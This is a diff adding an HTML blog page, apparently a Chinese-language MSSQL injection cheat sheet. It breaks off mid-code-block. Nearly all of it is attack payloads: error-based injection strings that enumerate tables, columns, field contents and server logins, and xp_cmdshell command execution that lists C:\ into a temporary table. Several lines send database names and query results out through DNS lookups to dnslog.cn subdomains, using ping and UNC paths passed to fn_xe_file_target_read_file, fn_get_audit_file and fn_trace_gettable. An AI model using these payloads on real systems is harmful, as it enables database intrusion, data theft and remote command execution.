@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang='en' ><meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+
+
+<title>mssql | DDTT95</title>
+
+<meta name="generator" content="Hugo Eureka 0.8.3" />
+<link rel="stylesheet" href="/css/eureka.min.css">
+<script defer src="/js/eureka.min.js"></script>
+
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload"
+  href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&family=Noto+Serif+SC:wght@400;600;700&display=swap"
+  as="style" onload="this.onload=null;this.rel='stylesheet'">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/styles/solarized-light.min.css"
+   media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/highlight.min.js"
+   crossorigin></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/js/all.min.js"
+   integrity="sha256-uNYoXefWRqv&#43;PsIF/OflNmwtKM4lStn9yrz2gVl6ymo="  crossorigin></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
+   integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3&#43;Aro6EYUG4&#43;cU&#43;KJWu/X"  media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" 
+  integrity="sha384-g7c&#43;Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI&#43;sEnkvrMWph2EDg4"  crossorigin></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
+   integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC&#43;Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa"  crossorigin></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    renderMathInElement(document.body, {
+      delimiters: [
+        { left: "$$", right: "$$", display: true },
+        { left: "$", right: "$", display: false },
+        { left: "\\(", right: "\\)", display: false },
+        { left: "\\[", right: "\\]", display: true }
+      ],
+    });
+  });
+</script>
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/mermaid@8.9.2/dist/mermaid.min.js" 
+  integrity="sha256-Zmpaaj&#43;GXFsPF5WdPArSrnW3b30dovldeKsW00xBVwE="  crossorigin></script>
+
+
+<link rel="icon" type="image/png" sizes="32x32" href="/images/icon_hu64421c6c7700f606f0ad45d807017b09_5843_32x32_fill_box_center_3.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/icon_hu64421c6c7700f606f0ad45d807017b09_5843_180x180_fill_box_center_3.png">
+
+<meta name="description"
+  content="mssql注入">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+      "@type": "ListItem",
+      "position": 1 ,
+      "name":"Posts",
+      "item":"/posts/"},{
+      "@type": "ListItem",
+      "position": 2 ,
+      "name":"mssql",
+      "item":"/posts/mssql/"}]
+}
+</script>
+
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "/posts/mssql/"
+    },
+    "headline": "mssql | DDTT95","datePublished": "2021-10-10T00:00:00+00:00",
+    "dateModified": "2021-10-10T00:00:00+00:00",
+    "wordCount":  204 ,
+    "author": {
+        "@type": "Person",
+        "name": ["DT"]
+    },
+    "publisher": {
+        "@type": "Person",
+        "name": "C. Wang",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "/images/icon.png"
+        }
+        },
+    "description": "mssql注入"
+}
+</script><meta property="og:title" content="mssql | DDTT95" />
+<meta property="og:type" content="article" />
+
+
+<meta property="og:image" content="/images/icon.png">
+
+
+<meta property="og:url" content="/posts/mssql/" />
+
+
+
+<meta property="og:description" content="mssql注入" />
+
+
+
+<meta property="og:locale" content="en" />
+
+
+
+
+<meta property="og:site_name" content="DDTT95" />
+
+
+
+
+
+
+<meta property="article:published_time" content="2021-10-10T00:00:00&#43;00:00" />
+
+
+<meta property="article:modified_time" content="2021-10-10T00:00:00&#43;00:00" />
+
+
+
+<meta property="article:section" content="posts" />
+
+
+<meta property="article:tag" content="注入" />
+
+<meta property="article:tag" content="注入" />
+
+
+
+
+
+<body class="flex flex-col min-h-screen">
+  <header class="fixed flex items-center w-full min-h-16 pl-scrollbar z-50 bg-secondary-bg shadow-sm">
+    <div class="w-full max-w-screen-xl mx-auto"><script>
+    let storageColorScheme = localStorage.getItem("lightDarkMode")
+    if (((storageColorScheme == 'Auto' || storageColorScheme == null) && window.matchMedia("(prefers-color-scheme: dark)").matches) || storageColorScheme == "Dark") {
+        document.getElementsByTagName('html')[0].classList.add('dark')
+    }
+</script>
+<nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0">
+    <a href="/" class="mr-6 text-primary-text text-xl font-bold">DDTT95</a>
+    <button id="navbar-btn" class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <div id="target"
+        class="hidden block md:flex md:flex-grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20">
+        <div class="md:flex md:h-16 text-sm md:flex-grow pb-4 md:pb-0 border-b md:border-b-0">
+            <a href="/#about" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  mr-4">关于我</a>
+            <a href="/posts/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  selected-menu-item  mr-4">文章</a>
+            <a href="/docs/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  mr-4">文档</a>
+        </div>
+
+        <div class="flex">
+            <div class="relative pt-4 md:pt-0">
+                <div class="cursor-pointer hover:text-eureka" id="lightDarkMode">
+                    <i class="fas fa-adjust"></i>
+                </div>
+                <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id="is-open">
+                </div>
+                <div class="absolute flex flex-col left-0 md:left-auto right-auto md:right-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40"
+                    id='lightDarkOptions'>
+                    <span class="px-4 py-1 hover:text-eureka" name="Light">Light</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Dark">Dark</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Auto">Auto</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id="is-open-mobile">
+    </div>
+
+</nav>
+<script>
+    
+    let element = document.getElementById('lightDarkMode')
+    if (storageColorScheme == null || storageColorScheme == 'Auto') {
+        document.addEventListener('DOMContentLoaded', () => {
+            window.matchMedia("(prefers-color-scheme: dark)").addEventListener('change', switchDarkMode)
+        })
+    } else if (storageColorScheme == "Light") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'sun')
+        element.firstElementChild.classList.add('fa-sun')
+    } else if (storageColorScheme == "Dark") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'moon')
+        element.firstElementChild.classList.add('fa-moon')
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        getcolorscheme();
+        switchBurger();
+    });
+</script>
+</div>
+  </header>
+  <main class="flex-grow pt-16">
+    <div class="pl-scrollbar">
+      <div class="w-full max-w-screen-xl lg:px-4 xl:px-8 mx-auto">
+
+
+<div class="grid grid-cols-2 lg:grid-cols-8 gap-4 lg:pt-12">
+    <div
+        class="col-span-2  lg:col-span-6 bg-secondary-bg rounded px-6 py-8">
+        <h1 class="font-bold text-3xl text-primary-text">mssql</h1>
+        <div class="flex flex-wrap flex-row items-center mt-2 text-tertiary-text">
+    <div class="mr-6 my-2">
+        <i class="fas fa-calendar mr-1"></i>
+        <span>2021-10-10</span>
+    </div>
+    <div class="mr-6 my-2">
+        <i class="fas fa-clock mr-1"></i>
+        <span>1 min read</span>
+    </div>
+    
+    
+    <div class="mr-6 my-2">
+        <i class="fas fa-folder mr-1"></i>
+        
+        <a href="/categories/web/" class="hover:text-eureka">web</a>
+        
+    </div>
+    
+
+    
+</div>
+        
+        
+        
+
+        <div class="content">
+            <h2 id="爆表名">爆表名</h2>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#ba2121">&#39; and 1=(select top 1 name from sysobjects where xtype=&#39;</span>u<span style="color:#ba2121">&#39; and name !=&#39;</span>info<span style="color:#ba2121">&#39;);--
+</span><span style="color:#ba2121">
+</span><span style="color:#ba2121">没当爆出来一个表名需要添加!= 之前的表名
+</span><span style="color:#ba2121">and 1=(select top 1 name from sysobjects where xtype=&#39;</span>u<span style="color:#ba2121">&#39; and name !=&#39;</span>info<span style="color:#ba2121">&#39; and name != &#39;</span><span style="color:#008000;font-weight:bold">new</span><span style="color:#ba2121">&#39;);
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span>top<span style="color:#bbb"> </span><span style="color:#666">1</span><span style="color:#bbb"> </span>name<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">from</span><span style="color:#bbb"> </span>(<span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span>top<span style="color:#bbb"> </span><span style="color:#666">2</span><span style="color:#bbb"> </span>name<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">from</span><span style="color:#bbb"> </span>sysobjects<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">where</span><span style="color:#bbb"> </span>xtype<span style="color:#666">=</span><span style="color:#666">0</span>x75<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">order</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">by</span><span style="color:#bbb"> </span>name)<span style="color:#bbb"> </span>t<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">order</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">by</span><span style="color:#bbb"> </span>name<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">desc</span><span style="color:#bbb">
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="爆字段名">爆字段名</h2>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#ba2121">&#39; and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#39;</span><span style="color:#008000;font-weight:bold">admin</span><span style="color:#ba2121">&#39;) and name&lt;&gt;&#39;</span>id<span style="color:#ba2121">&#39;);--  
+</span><span style="color:#ba2121">
+</span><span style="color:#ba2121">也是一样的爆出来一个 去!=一个
+</span><span style="color:#ba2121">and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#39;</span><span style="color:#008000;font-weight:bold">admin</span><span style="color:#ba2121">&#39;) and name&lt;&gt;&#39;</span>id<span style="color:#ba2121">&#39; and name !=&#39;</span>kind<span style="color:#ba2121">&#39; and name !=&#39;</span>u_name<span style="color:#ba2121">&#39;and name !=&#39;</span>u_id<span style="color:#ba2121">&#39;and name !=&#39;</span>u_password<span style="color:#ba2121">&#39;)
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">(<span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span>col_name(object_id(<span style="color:#ba2121">&#39;表名&#39;</span>),n))<span style="color:#bbb">
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="爆字段内容">爆字段内容</h2>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="">爆多语句</span><span style="color:#bbb"> </span><span style="">多</span>top的方法<span style="color:#bbb">
+</span><span style="color:#bbb"></span><span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span>top<span style="color:#bbb"> </span><span style="color:#666">1</span><span style="color:#bbb"> </span>users<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">from</span><span style="color:#bbb"> </span>(<span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span>top<span style="color:#bbb"> </span><span style="color:#666">2</span><span style="color:#bbb"> </span>users<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">from</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">admin</span>)<span style="color:#bbb"> </span>t<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">order</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">by</span><span style="color:#bbb"> </span>users<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">desc</span><span style="color:#bbb"> </span><span style="color:#408080;font-style:italic">-- q
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="遍历用户">遍历用户</h2>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#008000;font-weight:bold">and</span><span style="color:#bbb"> </span><span style="color:#666">1</span><span style="color:#666">=</span>(<span style="color:#008000;font-weight:bold">SELECT</span><span style="color:#bbb"> </span>top<span style="color:#bbb"> </span><span style="color:#666">1</span><span style="color:#bbb"> </span>name<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">FROM</span><span style="color:#bbb"> </span>sys.syslogins<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">where</span><span style="color:#bbb"> </span>name<span style="color:#bbb"> </span><span style="color:#666">!=</span><span style="color:#bbb"> </span><span style="color:#ba2121">&#39;sa&#39;</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">and</span><span style="color:#bbb"> </span>name<span style="color:#bbb"> </span><span style="color:#666">!=</span><span style="color:#bbb"> </span><span style="color:#ba2121">&#39;cchwww&#39;</span>)<span style="color:#bbb">
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="mssql-xp_cmdshell-dns外带数据">mssql xp_cmdshell-dns外带数据</h2>
+<h3 id="允许堆叠">允许堆叠</h3>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#008000;font-weight:bold">DECLARE</span><span style="color:#bbb"> </span><span style="color:#666">@</span><span style="color:#008000;font-weight:bold">host</span><span style="color:#bbb"> </span><span style="color:#008000">varchar</span>(<span style="color:#666">1024</span>);<span style="color:#bbb">                                        </span><span style="">声明变量</span><span style="color:#666">@</span><span style="color:#008000;font-weight:bold">host</span><span style="color:#bbb">
+</span><span style="color:#bbb">
+</span><span style="color:#bbb"></span><span style="color:#008000;font-weight:bold">SELECT</span><span style="color:#bbb"> </span><span style="color:#666">@</span><span style="color:#008000;font-weight:bold">host</span><span style="color:#666">=</span><span style="color:#ba2121">&#39;ping &#39;</span><span style="color:#666">+</span>(<span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span>db_name())<span style="color:#666">+</span><span style="color:#ba2121">&#39;.bll6ub.dnslog.cn&#39;</span>;<span style="color:#bbb">        </span><span style="">变量赋值</span><span style="color:#bbb">
+</span><span style="color:#bbb">
+</span><span style="color:#bbb"></span><span style="color:#008000;font-weight:bold">EXEC</span>(<span style="color:#ba2121">&#39;master..xp_cmdshell&#39;</span><span style="color:#666">+</span><span style="color:#ba2121">&#39;&#34;&#39;</span><span style="color:#666">+@</span><span style="color:#008000;font-weight:bold">host</span><span style="color:#666">+</span><span style="color:#ba2121">&#39;&#34;&#39;</span>);<span style="color:#bbb">                          </span><span style="">执行命令</span><span style="color:#bbb">   
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#008000;font-weight:bold">and</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">exists</span>(<span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span><span style="color:#666">*</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">from</span><span style="color:#bbb"> </span>fn_xe_file_target_read_file(<span style="color:#ba2121">&#39;C:*.xls&#39;</span>,<span style="color:#ba2121">&#39;\\&#39;</span><span style="color:#666">+</span>(<span style="">需要查询的内容</span>)<span style="color:#666">+</span><span style="color:#ba2121">&#39;.bde3xv.dnslog.cn\1.txt&#39;</span>,<span style="color:#008000;font-weight:bold">null</span>,<span style="color:#008000;font-weight:bold">null</span>))<span style="color:#bbb">
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">(<span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span><span style="color:#666">1</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">where</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">exists</span>(<span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span><span style="color:#666">*</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">from</span><span style="color:#bbb"> </span>fn_get_audit_file(<span style="color:#ba2121">&#39;\\&#39;</span><span style="color:#666">+</span>(<span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span>db_name())<span style="color:#666">+</span><span style="color:#ba2121">&#39;.71dg9y.dnslog.cn\&#39;</span>,<span style="color:#008000;font-weight:bold">default</span>,<span style="color:#008000;font-weight:bold">default</span>)))<span style="color:#bbb">
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#008000;font-weight:bold">and</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">exists</span>(<span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span><span style="color:#666">*</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">from</span><span style="color:#bbb"> </span>fn_trace_gettable(<span style="color:#ba2121">&#39;\\&#39;</span><span style="color:#666">+</span>(<span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span>db_name())<span style="color:#666">+</span><span style="color:#ba2121">&#39;.6bg39e.dnslog.cn\1.trc&#39;</span>,<span style="color:#008000;font-weight:bold">default</span>))<span style="color:#bbb">
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="创建表把查询的数据放入表中再从表中查询-通过改变id的值去查询表中的内容">创建表，把查询的数据放入表中再从表中查询-通过改变id的值去查询表中的内容</h2>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#008000;font-weight:bold">drop</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">table</span><span style="color:#bbb"> </span>cmdtmp;<span style="color:#bbb">
+</span><span style="color:#bbb"></span><span style="color:#008000;font-weight:bold">CREATE</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">TABLE</span><span style="color:#bbb"> </span>cmdtmp<span style="color:#bbb"> </span>([Id]<span style="color:#bbb"> </span><span style="color:#008000">BIGINT</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">PRIMARY</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">KEY</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">IDENTITY</span>(<span style="color:#666">1</span>,<span style="color:#666">1</span>),[dir]<span style="color:#bbb"> </span><span style="color:#008000">varchar</span>(<span style="color:#666">8000</span>));<span style="color:#bbb">
+</span><span style="color:#bbb"></span><span style="color:#008000;font-weight:bold">insert</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">into</span><span style="color:#bbb"> </span>cmdtmp(dir)<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">exec</span><span style="color:#bbb"> </span>master..xp_cmdshell<span style="color:#bbb"> </span><span style="color:#ba2121">&#39;dir c:\&#39;</span>;<span style="color:#bbb">
+</span><span style="color:#bbb"></span><span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span>top<span style="color:#bbb"> </span><span style="color:#666">1</span><span style="color:#bbb"> </span>dir<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">from</span><span style="color:#bbb"> </span>cmdtmp<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">where</span><span style="color:#bbb"> </span>id<span style="color:#666">=</span><span style="color:#666">2</span><span style="color:#bbb">
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="mssql报错查数字型的数据">mssql报错查数字型的数据</h2>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#008000;font-weight:bold">DECLARE</span><span style="color:#bbb"> </span><span style="color:#666">@</span><span style="color:#008000;font-weight:bold">host</span><span style="color:#bbb"> </span><span style="color:#008000">varchar</span>(<span style="color:#666">1024</span>);<span style="color:#bbb">
+</span><span style="color:#bbb"></span><span style="color:#008000;font-weight:bold">SELECT</span><span style="color:#bbb"> </span><span style="color:#666">@</span><span style="color:#008000;font-weight:bold">host</span><span style="color:#666">=</span><span style="color:#ba2121">&#39;a&#39;</span><span style="color:#666">+</span>(<span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span>username<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">from</span><span style="color:#bbb"> </span>users<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">where</span><span style="color:#bbb"> </span>id<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#666">3</span>);<span style="color:#bbb">
